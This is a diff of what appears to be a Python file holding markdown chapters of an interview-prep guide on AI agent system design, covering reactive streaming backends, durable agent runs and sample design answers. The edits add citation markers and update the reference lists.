 - **[3]** Shunyu Yao et al., *tau-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains* (2024) — [arxiv.org/abs/2406.12045](https://arxiv.org/abs/2406.12045)
+- **[4]** Lianmin Zheng et al., *Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena* (NeurIPS 2023) — [arxiv.org/abs/2306.05685](https://arxiv.org/abs/2306.05685)
 """
     ),
     (
         "ch18-reactive-backend-and-concurrency.md",
         """# Chapter 18: Reactive Agent Backends (Spring WebFlux), High-Contention Concurrency & Keyset Pagination
 
-*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
+*Part IV · Autonomous Agent Systems · 8 min core · 17 min with deep dives*
 
 An LLM is only 20% of a production agent platform. The other 80% is high-concurrency backend systems engineering:
 1. Holding **50,000 open streaming connections** for 10 seconds each without exhausting OS threads.
@@ -1723,10 +1734,10 @@ Now replace that with an **AI Agent stream** that runs for **`10 seconds`**: eac
 What happens when a user closes their browser tab `2 seconds` into a `15-second` multi-tool agent run? Without explicit **cancellation propagation**, your backend keeps burning GPU tokens and executing downstream tools for a nobody!
 
 1. **Cooperative Cancellation Chain:**
-   - Netty detects TCP `FIN/RST` on the SSE socket -> triggers Reactor `.doOnCancel()` (or `AbortSignal` / `Context` cancellation).
+   - Netty detects TCP `FIN/RST` on the SSE socket -> triggers Reactor `.doOnCancel()` (or `AbortSignal` / `Context` cancellation) [1, 4].
    - The orchestrator immediately aborts the upstream HTTP stream to the LLM provider (stopping token generation & billing mid-sentence) and sends JSON-RPC `notifications/cancelled` to any in-flight MCP tool servers.
-2. **Thread/Worker Bulkhead Isolation:** Never share one worker pool across fast API reads, slow PDF parsing, and untrusted tool sandboxes. Isolate into separate bounded pools (**Bulkhead Pattern**) so a spike in slow PDF ingestion can only saturate its own `32`-worker pool while normal chat streams stay sub-second.
-3. **Reactive Backpressure:** If a fast producer (`500 tokens/sec` batch stream or log tail) overwhelms a slow mobile client or DB sink, unbounded memory buffers trigger `OutOfMemoryError`. Enforce bounded ring buffers (`onBackpressureBuffer(256, DROP_OLDEST)` for UI progress events, or TCP window throttling / `429 Retry-After` at ingress).
+2. **Thread/Worker Bulkhead Isolation:** Never share one worker pool across fast API reads, slow PDF parsing, and untrusted tool sandboxes. Isolate into separate bounded pools (**Bulkhead Pattern**) so a spike in slow PDF ingestion can only saturate its own `32`-worker pool while normal chat streams stay sub-second [1].
+3. **Reactive Backpressure:** If a fast producer (`500 tokens/sec` batch stream or log tail) overwhelms a slow mobile client or DB sink, unbounded memory buffers trigger `OutOfMemoryError`. Enforce bounded ring buffers (`onBackpressureBuffer(256, DROP_OLDEST)` for UI progress events, or TCP window throttling / `429 Retry-After` at ingress) [4].
 
 :::
 
@@ -1805,8 +1816,9 @@ When interviewers ask how to fix a high-throughput shared counter (like a global
 
 ### Sources & References
 - **[1]** Spring AI & Spring WebFlux Reference — *Reactive `ChatClient`, `Flux` SSE Streaming & `Schedulers.boundedElastic()`* — [docs.spring.io/spring-ai/reference](https://docs.spring.io/spring-ai/reference/)
-- **[2]** Brian Goetz et al., *Java Concurrency in Practice* & JDK `LongAdder` — CAS Contention vs. Striped Counters
-- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)*, Chapter 3 (Storage Engines) & Chapter 8 (Fencing Tokens & Distributed Locks)
+- **[2]** Brian Goetz et al., *Java Concurrency in Practice* & JDK `java.util.concurrent.atomic.LongAdder` — CAS Contention vs. Striped Counters
+- **[3]** Martin Kleppmann, *How to do distributed locking (Fencing Tokens)* & *Designing Data-Intensive Applications (DDIA)* — [martin.kleppmann.com](https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html)
+- **[4]** Project Reactor Reference Guide, *Reactive Streams Backpressure, Cancellation & Schedulers* — [projectreactor.io/docs/core/release/reference](https://projectreactor.io/docs/core/release/reference/)
 """
     ),
     (
@@ -1836,7 +1848,7 @@ Instead of blocking inside one synchronous request, expose a **5-endpoint Asynch
 | :--- | :--- | :--- |
 | **`POST /agent/runs`** | Accepts `Idempotency-Key` + goal; returns **`202 Accepted`** + `{run_id, status: "QUEUED"}` in `< 25 ms`. | Inserts `agent_runs` row (`QUEUED`) and publishes `run_id` to `Kafka: agent.runs` via transactional outbox. |
 | **`GET /agent/runs/{id}`** | Returns current state (`QUEUED`, `RUNNING`, `WAITING_APPROVAL`, `COMPLETED`, `FAILED`, `CANCELLED`). | Fast primary-key read from Postgres / Redis state cache for polling or UI hydration. |
-| **`GET /agent/runs/{id}/events`** | Server-Sent Events (`SSE`) accepting **`Last-Event-ID: 42`** header. | Replays any missed events `> 42` from a **Redis Stream (`XREAD`)** before tailing live tokens—surviving mobile Wi-Fi drops seamlessly! |
+| **`GET /agent/runs/{id}/events`** | Server-Sent Events (`SSE`) accepting **`Last-Event-ID: 42`** header [4]. | Replays any missed events `> 42` from a **Redis Stream (`XREAD`)** before tailing live tokens—surviving mobile Wi-Fi drops seamlessly! |
 | **`POST /runs/{id}/approvals`** | Submits `{step_id, decision: "APPROVED" or "REJECTED"}`. | Transitions state `WAITING_APPROVAL -> QUEUED` and re-enqueues `run_id` so *any* stateless worker resumes from the checkpoint! |
 | **`POST /runs/{id}/cancel`** | Sets `cancel_requested = true` + publishes cancel signal on Redis Pub/Sub. | Active worker aborts in-flight LLM/MCP calls at the next token/checkpoint and transitions to `CANCELLED`. |
 
@@ -1854,8 +1866,8 @@ How do you guarantee a multi-step agent run survives a worker pod crash on Step 
    - Worker claims a run via atomic `UPDATE agent_runs SET lease_owner = :pod, lease_expires_at = now() + 15s, lease_epoch = lease_epoch + 1` and renews every `5s`.
    - Before every LLM call or tool execution, the worker checks if `(run_id, step_idx)` already has a committed `output_json` in `agent_steps`.
 3. **Mid-Step Pod Death Walkthrough:**
-   - Suppose Pod A finishes Steps `1..3` (committed to `agent_steps`), calls `create_jira_ticket()` in Step `4` with `idempotency_key = SHA256(run_id + ":4")`, and OOM-crashes *before* writing Step 4's result to Postgres.
-   - `15 seconds` later, a lease-reaper re-queues `run_id`. Pod B loads Steps `1..3` directly from `agent_steps` (`0` LLM tokens spent!), re-invokes Step `4` with the **exact same deterministic `idempotency_key`**, receives the cached Jira ticket ID from the deduplication layer, commits Step `4` with `lease_epoch`, and finishes the run!
+   - Suppose Pod A finishes Steps `1..3` (committed to `agent_steps`), calls `create_jira_ticket()` in Step `4` with `idempotency_key = SHA256(run_id + ":4")`, and OOM-crashes *before* writing Step 4's result to Postgres [1, 2].
+   - `15 seconds` later, a lease-reaper re-queues `run_id`. Pod B loads Steps `1..3` directly from `agent_steps` (`0` LLM tokens spent!), re-invokes Step `4` with the **exact same deterministic `idempotency_key`**, receives the cached Jira ticket ID from the deduplication layer, commits Step `4` with `lease_epoch`, and finishes the run [1, 3]!
 
 :::
 
@@ -1871,7 +1883,7 @@ Running `1,000,000` multi-step tasks per day introduces failure modes that ordin
    - Track rolling `30s` windows of `HTTP 429/5xx` and `p95 TTFT` per `(provider, region, model)`. If `us-east` hits a GPU brownout, trip the circuit breaker to `OPEN` and fail over new turns to `eu-west` or a secondary model family via a normalized OpenAI/Spring-AI schema adapter—while keeping healthy runs **sticky by `run_id`** to preserve GPU KV prefix caches!
 3. **Two-Phase Redis Lua Token & Cost Budgets:**
    - Standard request-count rate limiting (`100 req/min`) fails when Request A uses `400` tokens and Request B uses `60,000` tokens.
-   - **Pre-Flight Reserve + Post-Turn Reconcile:** Before calling the LLM, atomically reserve `estimated_input_tokens + max_output_tokens` in a per-tenant Redis Lua token bucket. Once the stream finishes, refund `max_output_tokens - actual_output_tokens` and increment `tenant_daily_spend_usd`—halting runaway tenants before they exceed their contract cap.
+   - **Pre-Flight Reserve + Post-Turn Reconcile:** Before calling the LLM, atomically reserve `estimated_input_tokens + max_output_tokens` in a per-tenant Redis Lua token bucket [5]. Once the stream finishes, refund `max_output_tokens - actual_output_tokens` and increment `tenant_daily_spend_usd`—halting runaway tenants before they exceed their contract cap.
 
 :::deepdive Envelope Capacity Math & Fair Queuing for 1,000,000 Runs/Day | +5 min
 
@@ -1884,7 +1896,7 @@ Always ground a `1M runs/day` design prompt with 60-second back-of-the-envelope 
   - If an active run takes `6 seconds` on average, Little's Law (`L = λ × W`) gives `60 runs/s × 6s = 360` concurrent active runs—easily served by **`8–12` reactive orchestrator pods**!
 - **Multi-Tenant Noisy-Neighbor Isolation:**
   - Never put interactive user chat runs and `50,000-item` offline batch runs into the same FIFO queue!
-  - Split into **`agent.runs.interactive`** (SLO `< 3s` TTFT, dedicatedTPM reservation) and **`agent.runs.batch`** (spot/provisioned-spillover capacity), using **Weighted Fair Queuing / Deficit Round Robin per `tenant_id`** so Tenant A submitting 10,000 jobs cannot delay Tenant B's single interactive request by more than one scheduling quantum.
+  - Split into **`agent.runs.interactive`** (SLO `< 3s` TTFT, dedicatedTPM reservation) and **`agent.runs.batch`** (spot/provisioned-spillover capacity), using **Weighted Fair Queuing / Deficit Round Robin per `tenant_id`** so Tenant A submitting 10,000 jobs cannot delay Tenant B's single interactive request by more than one scheduling quantum [3, 5].
 
 :::
 
@@ -1923,9 +1935,11 @@ Always ground a `1M runs/day` design prompt with 60-second back-of-the-envelope 
 ---
 
 ### Sources & References
-- **[1]** Temporal Engineering, *Durable Execution for AI Agents & Human-in-the-Loop Workflows* (2025) — [temporal.io](https://temporal.io/)
-- **[2]** Anthropic & OpenAI API Guides, *Streaming Responses, Background Runs & Rate-Limit Token Buckets* (2025–2026)
-- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)* — Event-Driven State Machines, Leases & Idempotency
+- **[1]** Temporal Documentation, *Durable Execution for Long-Running Workflows & AI Agents* — [docs.temporal.io](https://docs.temporal.io/)
+- **[2]** LangGraph Documentation, *Durable Execution, Checkpointers & Human-in-the-Loop Interrupts* — [docs.langchain.com/oss/python/langgraph/durable-execution](https://docs.langchain.com/oss/python/langgraph/durable-execution)
+- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)* & *How to do distributed locking* — [martin.kleppmann.com](https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html)
+- **[4]** WHATWG HTML Living Standard, *Server-Sent Events (`EventSource` & `Last-Event-ID` Reconnection)* — [html.spec.whatwg.org/multipage/server-sent-events.html](https://html.spec.whatwg.org/multipage/server-sent-events.html)
+- **[5]** Stripe Engineering, *Scaling Your API with Rate Limiters & Load Shedders* — [stripe.com/blog/rate-limiters](https://stripe.com/blog/rate-limiters)
 """
     ),
     (
@@ -1962,8 +1976,8 @@ Keep this mental checklist ready for any `45-minute` agent design interview [1, 
 
 1. **Why an Agent Is Justified:** Root-causing an unfamiliar stack trace requires dynamic hypothesis testing (`grep -> read caller -> inspect git blame -> reproduce test`), which cannot be hardcoded as a fixed pipeline—paired with a deterministic **Evaluator-Optimizer** inner loop (`Edit -> Compile -> Test -> Lint`) [1].
 2. **Sandbox & Tool Architecture (Top Half of Diagram):**
-   - Provision an **ephemeral Firecracker microVM** mounted to a shallow/CoW **Git worktree** at the failing commit SHA—containing **zero production DB credentials** and a default-deny egress firewall (allowing only the internal package mirror).
-   - Provide **coarse, token-efficient tools**: `symbol_usages(lsp)`, `ripgrep_search`, `git_log_range`, `read_file_lines`, `apply_unified_diff`, and `run_targeted_test(selector)`. Offload verbose compiler logs (`>1,000` tokens) to artifacts, feeding only failing assertion diffs into Working Memory.
+   - Provision an **ephemeral Firecracker microVM** [4] mounted to a shallow/CoW **Git worktree** at the failing commit SHA—containing **zero production DB credentials** and a default-deny egress firewall (allowing only the internal package mirror).
+   - Provide **coarse, token-efficient tools** (*Agent-Computer Interface* [5]): `symbol_usages(lsp)`, `ripgrep_search`, `git_log_range`, `read_file_lines`, `apply_unified_diff`, and `run_targeted_test(selector)`. Offload verbose compiler logs (`>1,000` tokens) to artifacts, feeding only failing assertion diffs into Working Memory.
 3. **Safety & Termination Gates:** Cap the Evaluator-Optimizer repair loop at `max_iterations = 4` and `wall_clock = 8 min`. Block edits to CI/security paths (`.github/`, `CODEOWNERS`). On green tests, push to `bot/fix-<ticket>` and open a **Draft PR** attaching the reproduction test and OTel trace—**never auto-merging to `main`**.
 
 ---
@@ -1974,7 +1988,7 @@ Keep this mental checklist ready for any `45-minute` agent design interview [1, 
 
 1. **MCP `1:1` Isolation & OAuth On-Behalf-Of (`OBO`):**
    - The **Enterprise MCP Host** spawns isolated **`1:1` MCP Clients** to the `Git`, `Ticketing`, and `Analytics` MCP Servers over Streamable HTTP [3].
-   - **Zero Shared Admin Keys:** For every tool call, the Host exchanges the user's SSO JWT via **OAuth 2.0 On-Behalf-Of (`OBO`)** for a short-lived, audience-scoped token (`aud="mcp://ticketing"`). Even under prompt injection, the Ticketing MCP Server physically cannot read tickets outside that user's Jira RBAC, and the Analytics MCP Server connects via a read-only database role with **Row-Level Security (`RLS`)**.
+   - **Zero Shared Admin Keys:** For every tool call, the Host exchanges the user's SSO JWT via **OAuth 2.0 On-Behalf-Of (`OBO`, RFC 8693)** [6] for a short-lived, audience-scoped token (`aud="mcp://ticketing"`). Even under prompt injection, the Ticketing MCP Server physically cannot read tickets outside that user's Jira RBAC, and the Analytics MCP Server connects via a read-only database role with **Row-Level Security (`RLS`)**.
 2. **Orchestration & Consent UX:**
    - Use **Plan-and-Execute** to fan out parallel read-only MCP calls (`git_recent_deploys` + `jira_open_incidents` + ACL-filtered runbook RAG), cutting multi-source latency from `7s` to `~2.2s`.
    - Any mutating tool (`jira_transition_issue`, `git_revert_pr`) pauses the durable run in `WAITING_APPROVAL` and renders a structured **User Consent Diff Card** in the UI before executing with a `SHA-256` idempotency key.
@@ -1984,7 +1998,7 @@ Keep this mental checklist ready for any `45-minute` agent design interview [1, 
 **Prompt:** *Design a customer-support system handling 500,000 tickets/day across order tracking, cancellations, address changes, and complex damaged-shipment disputes.*
 
 - **Step 1 — Don't Over-Agentify (`80 / 20` Split):**
-  - A fast intent classifier (`150 ms`) routes **`~80%` of traffic** (order status, standard within-window returns, FAQ) into **Deterministic Workflows**: fixed code fetches `get_order(session.user_id)`, evaluates exact business rules in Java/Python, and uses a single small-LLM call strictly to phrase a polite response. Cost: `<$0.001`, hallucinated policy risk: **`0%`**.
+  - A fast intent classifier (`150 ms`) routes **`~80%` of traffic** (order status, standard within-window returns, FAQ) into **Deterministic Workflows** [1, 2]: fixed code fetches `get_order(session.user_id)`, evaluates exact business rules in Java/Python, and uses a single small-LLM call strictly to phrase a polite response. Cost: `<$0.001`, hallucinated policy risk: **`0%`**.
 - **Step 2 — Bounded Exception Agent (`20%` Ambiguous Cases):**
   - Multi-item partial damages, carrier delays + loyalty exceptions route to a **Bounded ReAct/Two-Pass Agent** equipped with read tools (`get_order`, `get_carrier_scan`, `search_return_policy`) and policy-gated write tools (`issue_credit`, `reship_item`).
 - **Step 3 — Hard Financial Invariants:**
@@ -1998,8 +2012,8 @@ Keep this mental checklist ready for any `45-minute` agent design interview [1, 
 
 1. **Lead Planner -> Parallel Search Workers (`Map-Reduce` Context Isolation):**
    - If one agent runs 15 sequential searches, `60,000` tokens of noisy snippets flood one context window ("Lost in the Middle").
-   - Instead, a **Lead Planner** decomposes the prompt into `3–5` orthogonal sub-questions and spawns **parallel Sub-Agents** (`Agents-as-Tools`), each with its own isolated `16K` context window, `max_searches = 3`, and ACL-scoped hybrid retriever.
-   - Each worker returns **only compressed, source-tagged evidence cards** (`{claim, quote_span, doc_id, published_at, authority_tier}`)—discarding `90%` of raw HTML/chunk noise before reaching the Synthesizer!
+   - Instead, a **Lead Planner** decomposes the prompt into `3–5` orthogonal sub-questions and spawns **parallel Sub-Agents** (`Agents-as-Tools`), each with its own isolated `16K` context window, `max_searches = 3`, and ACL-scoped hybrid retriever [1, 2].
+   - Each worker returns **only compressed, source-tagged evidence cards** (`{claim, quote_span, doc_id, published_at, authority_tier}`)—discarding `90%` of raw HTML/chunk noise before reaching the Synthesizer [1]!
 2. **Conflict Resolution & Citation Verification:**
    - When an older 2024 doc contradicts a 2026 spec, instruct the Synthesizer to surface the version/date discrepancy explicitly rather than silently picking one.
    - Run a fast **Post-Generation Citation Verifier** (exact quote-span check + lightweight NLI entailment model) confirming every `[doc_id]` supports its sentence; strip or flag any unsupported sentence before marking the durable run `COMPLETED`.
@@ -2041,9 +2055,12 @@ Keep this mental checklist ready for any `45-minute` agent design interview [1, 
 ---
 
 ### Sources & References
-- **[1]** Anthropic Engineering, *Building Effective Agents* & *Multi-Agent Research System Architecture* (2024–2025) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
-- **[2]** OpenAI, *A Practical Guide to Building Agents* & *Agents SDK Orchestration* (2025–2026) — [developers.openai.com/api/docs/guides/agents/orchestration](https://developers.openai.com/api/docs/guides/agents/orchestration)
-- **[3]** Model Context Protocol (MCP) Specification (`2026-07-28`), *Authorization, Trust Boundaries & Architecture* — [modelcontextprotocol.io/specification/2026-07-28/architecture](https://modelcontextprotocol.io/specification/2026-07-28/architecture)
+- **[1]** Anthropic Engineering, *Building Effective Agents* & *How We Built Our Multi-Agent Research System* (2024–2025) — [anthropic.com/research/multi-agent-research-system](https://www.anthropic.com/research/multi-agent-research-system)
+- **[2]** OpenAI Developers, *Orchestrating Agents: Workflows, Handoffs & Guardrails* — [developers.openai.com/api/docs/guides/agents/orchestration](https://developers.openai.com/api/docs/guides/agents/orchestration)
+- **[3]** Model Context Protocol (MCP) Documentation, *Core Architecture, Authorization & Trust Boundaries* — [modelcontextprotocol.io/docs/learn/architecture](https://modelcontextprotocol.io/docs/learn/architecture)
+- **[4]** Alexandru Agache et al. (AWS), *Firecracker: Lightweight Virtualization for Serverless Applications* (USENIX NSDI 2020) — [usenix.org/conference/nsdi20/presentation/agache](https://www.usenix.org/conference/nsdi20/presentation/agache)
+- **[5]** John Yang et al., *SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering* (NeurIPS 2024) — [arxiv.org/abs/2405.15793](https://arxiv.org/abs/2405.15793)
+- **[6]** IETF RFC 8693, *OAuth 2.0 Token Exchange (Delegated On-Behalf-Of Security Tokens)* — [datatracker.ietf.org/doc/html/rfc8693](https://datatracker.ietf.org/doc/html/rfc8693)
 """
     ),
 ]
